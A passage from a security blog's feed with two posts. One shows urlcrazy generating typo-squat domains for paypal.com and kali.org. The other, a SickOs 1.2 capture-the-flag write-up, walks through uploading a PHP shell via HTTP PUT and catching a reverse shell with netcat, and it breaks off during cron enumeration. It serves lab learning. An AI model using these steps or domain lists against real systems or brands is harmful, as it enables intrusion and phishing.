<ul>
<li><a href="https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells">escape restricted Linux shells</a></li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _________________________________________
</span><span class='line'>/ Q: How many Zen masters does it take to \
</span><span class='line'>| screw in a light bulb? A: None. The     |
</span><span class='line'>| Universe spins the bulb, and the Zen    |
</span><span class='line'>| master stays out                        |
</span><span class='line'>|                                         |
</span><span class='line'>\ of the way.                             /
</span><span class='line'> -----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[urlcrazy - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/07/05/urlcrazy-kali-linux-tools/"/>
    <updated>2017-07-05T06:44:07-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/07/05/urlcrazy-kali-linux-tools</id>
    <content type="html"><![CDATA[<p><strong>Objective</strong> you want to detect possible URL hijacking or phishing of a domain, where unsuspecting users are lured to a malicious domain that is very similar to the original one. urlcrazy ftw!</p>

<p>Homepage: <a href="https://www.morningstarsecurity.com/research/urlcrazy">https://www.morningstarsecurity.com/research/urlcrazy</a></p>

<!-- more -->


<p></p>

<h2>urlcrazy description</h2>

<blockquote><p>Generate and test domain typos and variations to detect and perform typo squatting, URL hijacking,
phishing, and corporate espionage.</p>

<p>Usage</p>

<p>Detect typo squatters profiting from typos on your domain name</p>

<p>Protect your brand by registering popular typos</p>

<p>Identify typo domain names that will receive traffic intended for another domain</p>

<p>Conduct phishing attacks during a penetration test</p>

<p>Features</p>

<p>Generates 15 types of domain variants</p>

<p>Knows over 8000 common misspellings</p>

<p>Supports cosmic ray induced bit flipping</p>

<p>Multiple keyboard layouts (qwerty, azerty, qwertz, dvorak)</p>

<p>Checks if a domain variant is valid</p>

<p>Test if domain variants are in use</p>

<p>Estimate popularity of a domain variant URLCrazy requires Linux and the Ruby interpreter.</p></blockquote>

<h2>urlcrazy options</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>urlcrazy -h
</span><span class='line'>URLCrazy version 0.5
</span><span class='line'>by Andrew Horton (urbanadventurer)
</span><span class='line'>http://www.morningstarsecurity.com/research/urlcrazy
</span><span class='line'>
</span><span class='line'>Generate and test domain typos and variations to detect and perform typo squatting, URL hijacking,
</span><span class='line'>phishing, and corporate espionage.
</span><span class='line'>
</span><span class='line'>Supports the following domain variations:
</span><span class='line'>Character omission, character repeat, adjacent character swap, adjacent character replacement, double
</span><span class='line'>character replacement, adjacent character insertion, missing dot, strip dashes, singular or pluralise,
</span><span class='line'>common misspellings, vowel swaps, homophones, bit flipping (cosmic rays), homoglyphs, wrong top level
</span><span class='line'>domain, and wrong second level domain.
</span><span class='line'>
</span><span class='line'>Usage: /usr/bin/urlcrazy [options] domain
</span><span class='line'>
</span><span class='line'>Options
</span><span class='line'> -k, --keyboard=LAYOUT    Options are: qwerty, azerty, qwertz, dvorak (default: qwerty)
</span><span class='line'> -p, --popularity Check domain popularity with Google
</span><span class='line'> -r, --no-resolve Do not resolve DNS
</span><span class='line'> -i, --show-invalid   Show invalid domain names
</span><span class='line'> -f, --format=TYPE    Human readable or CSV (default: human readable)
</span><span class='line'> -o, --output=FILE    Output file
</span><span class='line'> -h, --help       This help
</span><span class='line'> -v, --version    Print version information. This version is 0.5</span></code></pre></td></tr></table></div></figure>


<h2>urlcrazy usage</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>urlcrazy kali.org
</span><span class='line'>/usr/share/urlcrazy/tld.rb:81: warning: key "2nd_level_registration" is duplicated and overwritten on line 81
</span><span class='line'>/usr/share/urlcrazy/tld.rb:89: warning: key "2nd_level_registration" is duplicated and overwritten on line 89
</span><span class='line'>/usr/share/urlcrazy/tld.rb:91: warning: key "2nd_level_registration" is duplicated and overwritten on line 91
</span><span class='line'>URLCrazy Domain Report
</span><span class='line'>Domain    : kali.org
</span><span class='line'>Keyboard  : qwerty
</span><span class='line'>At        : 2017-07-05 06:57:50 -0400
</span><span class='line'>
</span><span class='line'># Please wait. 63 hostnames to process
</span><span class='line'>
</span><span class='line'>Typo Type              Typo         DNS-A            CC-A               DNS-MX                                Extn  
</span><span class='line'>--------------------------------------------------------------------------------------------------------------------
</span><span class='line'>Character Omission     kai.org      111.89.129.15    JP,JAPAN           kai.org                               org   
</span><span class='line'>Character Omission     kal.org      69.172.201.153   US,UNITED STATES                                         org   
</span><span class='line'>Character Omission     kli.org      208.97.188.67    US,UNITED STATES   vade-in2.mail.dreamhost.com           org   
</span><span class='line'>Character Repeat       kaali.org    184.168.221.56   US,UNITED STATES   mailstore1.secureserver.net           org   
</span><span class='line'>Character Repeat       kalii.org                     ?                                                        org   
</span><span class='line'>Character Repeat       kalli.org                     ?                  mail.joker.com                        org   
</span><span class='line'>Character Repeat       kkali.org                     ?                                                        org   
</span><span class='line'>Character Swap         akli.org     180.240.134.81   SG,SINGAPORE       mail.akli.org                         org   
</span><span class='line'>Character Swap         kail.org     185.53.178.9                        mail.h-email.net                      org   
</span><span class='line'>Character Swap         klai.org     74.208.59.167    US,UNITED STATES   mx01.1and1.com                        org   
</span><span class='line'>Character Replacement  jali.org                      ?                  mailin1.totalweb.net.uk               org   
</span><span class='line'>Character Replacement  kaki.org                      ?                                                        org   
</span><span class='line'>Character Replacement  kalo.org     54.214.44.86     US,UNITED STATES   aspmx5.googlemail.com                 org   
</span><span class='line'>Character Replacement  kalu.org     64.85.171.16     US,UNITED STATES   host.rack-host.net                    org   
</span><span class='line'>Character Replacement  ksli.org     203.184.176.168  HK,HONG KONG                                             org   
</span><span class='line'>Character Replacement  lali.org     194.232.43.3     AT,AUSTRIA         dedi3762.your-server.de               org   
</span><span class='line'>Character Insertion    kalio.org    213.186.33.87    FR,FRANCE          mx2.ovh.net                           org   
</span><span class='line'>Character Insertion    kaliu.org    67.205.40.20     US,UNITED STATES   vade-in1.mail.dreamhost.com           org   
</span><span class='line'>Character Insertion    kalki.org    97.74.42.79      US,UNITED STATES   smtp.secureserver.net                 org   
</span><span class='line'>Character Insertion    kasli.org    217.112.35.116   GB,UNITED KINGDOM  mx25.valuehost.ru                     org   
</span><span class='line'>Character Insertion    kjali.org                     ?                                                        org   
</span><span class='line'>Character Insertion    klali.org                     ?                                                        org   
</span><span class='line'>Missing Dot            kaliorg.com                   ?                                                        com   
</span><span class='line'>Missing Dot            wwwkali.org                   ?                                                        org   
</span><span class='line'>Singular or Pluralise  kalis.org    217.160.233.111  DE,GERMANY         mx00.kundenserver.de                  org   
</span><span class='line'>Vowel Swap             kala.org     64.111.125.111   US,UNITED STATES   ASPMX2.GOOGLEMAIL.COM                 org   
</span><span class='line'>Vowel Swap             kale.org     185.53.178.9                        mail.h-email.net                      org   
</span><span class='line'>Vowel Swap             keli.org                      ?                  mail.hti.ag                           org   
</span><span class='line'>Vowel Swap             kili.org     69.172.201.153   US,UNITED STATES                                         org   
</span><span class='line'>Vowel Swap             koli.org     72.52.4.122      US,UNITED STATES   localhost                             org   
</span><span class='line'>Vowel Swap             kuli.org     37.120.172.191   JP,JAPAN           v2.v1.biz                             org   
</span><span class='line'>Homophones             kalaye.org                    ?                                                        org   
</span><span class='line'>Homophones             kaleye.org                    ?                                                        org   
</span><span class='line'>Bit Flipping           cali.org     23.21.169.243    US,UNITED STATES   alt1.aspmx.l.google.com               org   
</span><span class='line'>Bit Flipping           iali.org                      ?                                                        org   
</span><span class='line'>Bit Flipping           kadi.org     146.148.34.125   US,UNITED STATES   mail.hope-mail.com                    org   
</span><span class='line'>Bit Flipping           kahi.org     206.126.4.4      պ,                kahi-org.mail.protection.outlook.com  org   
</span><span class='line'>Bit Flipping           kalh.org     50.63.33.1       E�,                mailstore1.secureserver.net           org   
</span><span class='line'>Bit Flipping           kalk.org     137.74.127.233                                                            org   
</span><span class='line'>Bit Flipping           kalm.org                      ?                  mx.kalm.org.cust.a.hostedemail.com    org   
</span><span class='line'>Bit Flipping           kaly.org     207.148.248.143  US,UNITED STATES                                         org   
</span><span class='line'>Bit Flipping           kami.org     69.172.201.153   ��,                                                      org   
</span><span class='line'>Bit Flipping           kani.org     178.33.20.67     FR,FRANCE          mail.kani.org                         org   
</span><span class='line'>Bit Flipping           kcli.org     50.63.202.44     US,UNITED STATES   ALT1.ASPMX.L.GOOGLE.COM               org   
</span><span class='line'>Bit Flipping           kqli.org                      ?                                                        org   
</span><span class='line'>Bit Flipping           oali.org     184.107.215.202  CA,CANADA          oali.org                              org   
</span><span class='line'>Homoglyphs             ka1i.org                      ?                                                        org   
</span><span class='line'>Homoglyphs             kall.org     65.254.238.128   US,UNITED STATES   mx.kall.org                           org   
</span><span class='line'>Wrong TLD              kali.ca      76.74.246.51     US,UNITED STATES   kali.ca                               ca    
</span><span class='line'>Wrong TLD              kali.ch      81.221.254.5     CH,SWITZERLAND     kali.ch.2.arsmtp.com                  ch    
</span><span class='line'>Wrong TLD              kali.com     75.164.208.82    US,UNITED STATES   alt2.aspmx.l.google.com               com   
</span><span class='line'>Wrong TLD              kali.de      193.238.9.165    DE,GERMANY                                               de    
</span><span class='line'>Wrong TLD              kali.edu                      ?                                                        edu   
</span><span class='line'>Wrong TLD              kali.es      212.227.247.181  DE,GERMANY         mx01.1and1.es                         es    
</span><span class='line'>Wrong TLD              kali.fr      103.224.182.248                     mx92.mb5p.com                         fr    
</span><span class='line'>Wrong TLD              kali.it      195.110.124.188  IT,ITALY           mail.register.it                      it    
</span><span class='line'>Wrong TLD              kali.jp      8.6.19.68        US,UNITED STATES   smtp.secureserver.net                 jp    
</span><span class='line'>Wrong TLD              kali.net     45.40.165.16                        ASPMX.L.GOOGLE.COM                    net   
</span><span class='line'>Wrong TLD              kali.nl      72.52.4.121      US,UNITED STATES   localhost                             nl    
</span><span class='line'>Wrong TLD              kali.no      194.63.248.52    NO,NORWAY          mx02.domeneshop.no                    no    
</span><span class='line'>Wrong TLD              kali.ru      185.53.179.40                                                             ru    
</span><span class='line'>Wrong TLD              kali.se      92.42.73.20      SE,SWEDEN          kali-se.mail.protection.outlook.com   se    
</span><span class='line'>Wrong TLD              kali.us      184.168.221.28   US,UNITED STATES   209.150.186.51                        us   </span></code></pre></td></tr></table></div></figure>


<ul>
<li>check domain popularity with no DNS resolution</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>urlcrazy -p -r paypal.com
</span><span class='line'>/usr/share/urlcrazy/tld.rb:81: warning: key "2nd_level_registration" is duplicated and overwritten on line 81
</span><span class='line'>/usr/share/urlcrazy/tld.rb:89: warning: key "2nd_level_registration" is duplicated and overwritten on line 89
</span><span class='line'>/usr/share/urlcrazy/tld.rb:91: warning: key "2nd_level_registration" is duplicated and overwritten on line 91
</span><span class='line'>URLCrazy Domain Report
</span><span class='line'>Domain    : paypal.com
</span><span class='line'>Keyboard  : qwerty
</span><span class='line'>At        : 2017-07-05 07:01:52 -0400
</span><span class='line'>
</span><span class='line'># Please wait. 80 hostnames to process
</span><span class='line'>
</span><span class='line'>Typo Type              Typo           Pop  CC-A  Extn  
</span><span class='line'>-------------------------------------------------------
</span><span class='line'>Character Omission     papal.com           ?     com   
</span><span class='line'>Character Omission     payal.com           ?     com   
</span><span class='line'>Character Omission     paypa.com           ?     com   
</span><span class='line'>Character Omission     paypal.cm           ?     cm    
</span><span class='line'>Character Omission     paypl.com           ?     com   
</span><span class='line'>Character Omission     pypal.com           ?     com   
</span><span class='line'>Character Repeat       paaypal.com         ?     com   
</span><span class='line'>Character Repeat       paypaal.com         ?     com   
</span><span class='line'>Character Repeat       paypall.com         ?     com   
</span><span class='line'>Character Repeat       payppal.com         ?     com   
</span><span class='line'>Character Repeat       payypal.com         ?     com   
</span><span class='line'>Character Repeat       ppaypal.com         ?     com   
</span><span class='line'>Character Swap         apypal.com          ?     com   
</span><span class='line'>Character Swap         papyal.com          ?     com   
</span><span class='line'>Character Swap         payapl.com          ?     com   
</span><span class='line'>Character Swap         paypla.com          ?     com   
</span><span class='line'>Character Swap         pyapal.com          ?     com   
</span><span class='line'>Character Replacement  oaypal.com          ?     com   
</span><span class='line'>Character Replacement  patpal.com          ?     com   
</span><span class='line'>Character Replacement  paupal.com          ?     com   
</span><span class='line'>Character Replacement  payoal.com          ?     com   
</span><span class='line'>Character Replacement  paypak.com          ?     com   
</span><span class='line'>Character Replacement  paypsl.com          ?     com   
</span><span class='line'>Character Replacement  psypal.com          ?     com   
</span><span class='line'>Character Insertion    pasypal.com         ?     com   
</span><span class='line'>Character Insertion    paypalk.com         ?     com   
</span><span class='line'>Character Insertion    paypasl.com         ?     com   
</span><span class='line'>Character Insertion    paypoal.com         ?     com   
</span><span class='line'>Character Insertion    paytpal.com         ?     com   
</span><span class='line'>Character Insertion    payupal.com         ?     com   
</span><span class='line'>Character Insertion    poaypal.com         ?     com   
</span><span class='line'>Missing Dot            paypalcom.com       ?     com   
</span><span class='line'>Missing Dot            wwwpaypal.com       ?     com   
</span><span class='line'>Singular or Pluralise  paypals.com         ?     com   
</span><span class='line'>Vowel Swap             peypel.com          ?     com   
</span><span class='line'>Vowel Swap             piypil.com          ?     com   
</span><span class='line'>Vowel Swap             poypol.com          ?     com   
</span><span class='line'>Vowel Swap             puypul.com          ?     com   
</span><span class='line'>Bit Flipping           0aypal.com          ?     com   
</span><span class='line'>Bit Flipping           pa9pal.com          ?     com   
</span><span class='line'>Bit Flipping           paipal.com          ?     com   
</span><span class='line'>Bit Flipping           paqpal.com          ?     com   
</span><span class='line'>Bit Flipping           paxpal.com          ?     com   
</span><span class='line'>Bit Flipping           pay0al.com          ?     com   
</span><span class='line'>Bit Flipping           paypad.com          ?     com   
</span><span class='line'>Bit Flipping           paypah.com          ?     com   
</span><span class='line'>Bit Flipping           paypam.com          ?     com   
</span><span class='line'>Bit Flipping           paypan.com          ?     com   
</span><span class='line'>Bit Flipping           paypcl.com          ?     com   
</span><span class='line'>Bit Flipping           paypel.com          ?     com   
</span><span class='line'>Bit Flipping           paypil.com          ?     com   
</span><span class='line'>Bit Flipping           paypql.com          ?     com   
</span><span class='line'>Bit Flipping           payqal.com          ?     com   
</span><span class='line'>Bit Flipping           payral.com          ?     com   
</span><span class='line'>Bit Flipping           paytal.com          ?     com   
</span><span class='line'>Bit Flipping           payxal.com          ?     com   
</span><span class='line'>Bit Flipping           pcypal.com          ?     com   
</span><span class='line'>Bit Flipping           peypal.com          ?     com   
</span><span class='line'>Bit Flipping           piypal.com          ?     com   
</span><span class='line'>Bit Flipping           pqypal.com          ?     com   
</span><span class='line'>Bit Flipping           qaypal.com          ?     com   
</span><span class='line'>Bit Flipping           raypal.com          ?     com   
</span><span class='line'>Bit Flipping           taypal.com          ?     com   
</span><span class='line'>Bit Flipping           xaypal.com          ?     com   
</span><span class='line'>Homoglyphs             paypa1.com          ?     com   
</span><span class='line'>Wrong TLD              paypal.ca           ?     ca    
</span><span class='line'>Wrong TLD              paypal.ch           ?     ch    
</span><span class='line'>Wrong TLD              paypal.de           ?     de    
</span><span class='line'>Wrong TLD              paypal.edu          ?     edu   
</span><span class='line'>Wrong TLD              paypal.es           ?     es    
</span><span class='line'>Wrong TLD              paypal.fr           ?     fr    
</span><span class='line'>Wrong TLD              paypal.it           ?     it    
</span><span class='line'>Wrong TLD              paypal.jp           ?     jp    
</span><span class='line'>Wrong TLD              paypal.net          ?     net   
</span><span class='line'>Wrong TLD              paypal.nl           ?     nl    
</span><span class='line'>Wrong TLD              paypal.no           ?     no    
</span><span class='line'>Wrong TLD              paypal.org          ?     org   
</span><span class='line'>Wrong TLD              paypal.ru           ?     ru    
</span><span class='line'>Wrong TLD              paypal.se           ?     se    
</span><span class='line'>Wrong TLD              paypal.us           ?     us    </span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ________________________________________
</span><span class='line'>/ Everything that you know is wrong, but \
</span><span class='line'>\ you can be straightened out.           /
</span><span class='line'> ----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SickOs 1.2 writeup]]></title>
    <link href="http://chousensha.github.io/blog/2017/07/03/sickos-1-dot-2-writeup/"/>
    <updated>2017-07-03T04:20:13-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/07/03/sickos-1-dot-2-writeup</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s VM is the second machine in the SickOs series. The goal is to obtain the root flag. Target acquired!</p>

<!-- more -->


<p></p>

<p>I did a fast scan with Masscan and discovered that ports 22 and 80 are open. Then I scanned them with Nmap:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -T4 -p22,80 -sV 192.168.217.146
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.40 ( https://nmap.org ) at 2017-07-03 09:11 EDT
</span><span class='line'>Nmap scan report for 192.168.217.146
</span><span class='line'>Host is up (0.00030s latency).
</span><span class='line'>PORT   STATE SERVICE VERSION
</span><span class='line'>22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)
</span><span class='line'>80/tcp open  http    lighttpd 1.4.28</span></code></pre></td></tr></table></div></figure>


<p>The web server serves this pic:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/sickos/2-blow.jpg" title="web server" alt="webpage"></p>

<p>Nothing in exiftool. I bruteforced the web server, but the only discovery was an empty test directory. I initially overlooked the page source of the picture, until I noticed there is a scroll bar. So I scrolled down to find a comment:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!-- NOTHING IN HERE ///\\\ --&gt;&gt;&gt;&gt;</span></code></pre></td></tr></table></div></figure>


<p>I tried constructing a path out of the comment, but didn&rsquo;t get anywhere. Searching for an exploit for the lighttpd server version didn&rsquo;t yield anything either, although I found some for other versions.</p>

<p>Back to the empty directory, I found it strange that there would be an innocuous empty folder on the web server, and I thought it might hint to making it..not empty by uploading something there :&ndash;) I was at a loss on how to do that with no attack vectors, but then I remembered that uploading something on a server doesn&rsquo;t always require sophisticated mechanisms and PHP vulnerabilities and the like. It&rsquo;s just as simple as using a certain HTTP method that you don&rsquo;t see too often: <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/PUT">PUT</a></p>

<p>First, I needed to verify if PUT is allowed in the first place:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap --script http-methods --script-args http-methods.url-path='/test' 192.168.217.146
</span><span class='line'>PORT   STATE SERVICE
</span><span class='line'>80/tcp open  http
</span><span class='line'>| http-methods: 
</span><span class='line'>|   Supported Methods: PROPFIND DELETE MKCOL PUT MOVE COPY PROPPATCH LOCK UNLOCK GET HEAD POST OPTIONS
</span><span class='line'>|   Potentially risky methods: PROPFIND DELETE MKCOL PUT MOVE COPY PROPPATCH LOCK UNLOCK
</span><span class='line'>|_  Path tested: /test</span></code></pre></td></tr></table></div></figure>


<p>Excellent! I proceeded to upload a PHP shell with curl,but I got some weird expectation failed errors. Luckily, Nmap also has a script for PUT&#8217;ing things on a server:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p 80 192.168.217.146 --script http-put --script-args http-put.url='/test/shell.php',http-put.file='/root/Desktop/shell.php'
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.40 ( https://nmap.org ) at 2017-07-04 04:36 EDT
</span><span class='line'>Nmap scan report for 192.168.217.146
</span><span class='line'>Host is up (0.00031s latency).
</span><span class='line'>PORT   STATE SERVICE
</span><span class='line'>80/tcp open  http
</span><span class='line'>|_http-put: /test/shell.php was successfully created</span></code></pre></td></tr></table></div></figure>


<p>All didn&rsquo;t work well, though. I usually use 8888 for my reverse shells, but this time I got nothing. I tried port 80, and still no joy. It seems that only port 443 is allowed. I looked at other walkthroughs for this, so I&rsquo;m not sure how you could determine it otherwise besides trial and error. But when I changed to the correct port, I got the shell:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vnlp 443
</span><span class='line'>listening on [any] 443 ...
</span><span class='line'>connect to [192.168.217.132] from (UNKNOWN) [192.168.217.146] 49769
</span><span class='line'>Linux ubuntu 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
</span><span class='line'> 01:48:24 up  1:38,  0 users,  load average: 0.00, 0.01, 0.05
</span><span class='line'>USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span><span class='line'>/bin/sh: 0: can't access tty; job control turned off
</span><span class='line'>$ whoami
</span><span class='line'>www-data</span></code></pre></td></tr></table></div></figure>


<p>Next, I did some enumeration. The usual culprits didn&rsquo;t stand out, and the permissions on this shell were pretty limited, but I did find something interesting pertaining to cron:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ls -al /etc/cron*
</span><span class='line'>-rw-r--r-- 1 root root  722 Jun 19  2012 /etc/crontab
</span><span class='line'>
</span><span class='line'>ls: cannot open directory /etc/cron.d: Permission denied
